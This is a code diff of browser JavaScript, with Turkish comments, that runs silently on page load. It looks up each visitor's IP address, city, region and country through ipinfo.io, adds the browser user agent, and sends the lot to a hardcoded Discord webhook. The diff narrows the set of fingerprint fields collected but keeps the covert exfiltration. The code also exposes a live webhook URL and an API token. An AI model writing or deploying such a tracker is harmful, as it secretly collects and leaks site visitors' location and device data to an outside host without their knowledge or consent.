@@ -1,4 +1,4 @@
-async function sendDiscordMessage(message) {
+        async function sendDiscordMessage(message) {
   const webhookUrl = 'https://discord.com/api/webhooks/1375534402389413888/wfcYejfEJTgGFMR1hcxjfKwwMwn-hPriJ6Crmk0O6h_OrpXvnL2HMHAzNhy74HqrUhoW';
 
   const payload = {
@@ -17,52 +17,31 @@ async function sendDiscordMessage(message) {
     if (!res.ok) {
       throw new Error(`Discord API error: ${res.status}`);
     }
-  } catch (err) {}
+    console.log('Discord mesajı gönderildi!');
+  } catch (err) {
+    console.error('Discord mesaj gönderme hatası:', err);
+  }
 }
 
+// Sayfa yüklendiğinde ziyaretçi bilgisi gönder
 window.addEventListener('load', async () => {
   try {
-    const res = await fetch('https://ipinfo.io/json?token=f67c5ecf0e57d3');
+    const res = await fetch('https://ipinfo.io/json?token=f67c5ecf0e57d3'); // Token isteğe bağlı ama sınır yükseltir
     if (!res.ok) throw new Error('IP info API error');
     const visitor = await res.json();
 
-     const ua = navigator.userAgent;
-        const language = navigator.language;
-        const platform = navigator.platform;
-        const cookieEnabled = navigator.cookieEnabled;
-        const deviceMemory = navigator.deviceMemory || 'Unknown';
-        const hardwareConcurrency = navigator.hardwareConcurrency || 'Unknown';
-        const screenRes = `${screen.width}x${screen.height}`;
-        const availRes = `${screen.availWidth}x${screen.availHeight}`;
-        const pixelRatio = window.devicePixelRatio || 1;
-        const onlineStatus = navigator.onLine ? 'Yes' : 'No';
+    const deviceInfo = navigator.userAgent;
 
     const message = `
-    **💻 Visitor Info**
 IP: ${visitor.ip}
-Country: ${visitor.country || 'Unknown'}
-City: ${visitor.city || 'Unknown'}
-Region: ${visitor.region || 'Unknown'}
-Approx. Location: ${visitor.loc || 'Unknown'}
-ISP: ${visitor.org || 'Unknown'}
-Postal Code: ${visitor.postal || 'Unknown'}
-Timezone: ${visitor.timezone || 'Unknown'}
-
-**🖥️ System Info**
-Browser: ${ua.substring(0, 100)}
-Language: ${language}
-Platform: ${platform}
-Cookies Enabled: ${cookieEnabled ? 'Yes' : 'No'}
-RAM: ${deviceMemory} GB
-CPU Cores: ${hardwareConcurrency}
-Online: ${onlineStatus}
-
-**🖼️ Screen Info**
-Screen Resolution: ${screenRes}
-Available Space: ${availRes}
-Pixel Ratio: ${pixelRatio}
+Şehir: ${visitor.city || 'Bilinmiyor'}
+Bölge: ${visitor.region || 'Bilinmiyor'}
+Ülke: ${visitor.country || 'Bilinmiyor'}
+Cihaz: ${deviceInfo.substring(0, 100)}
     `;
 
     sendDiscordMessage(message);
-  } catch (e) {}
+  } catch (e) {
+    console.error(e);
+  }
 });
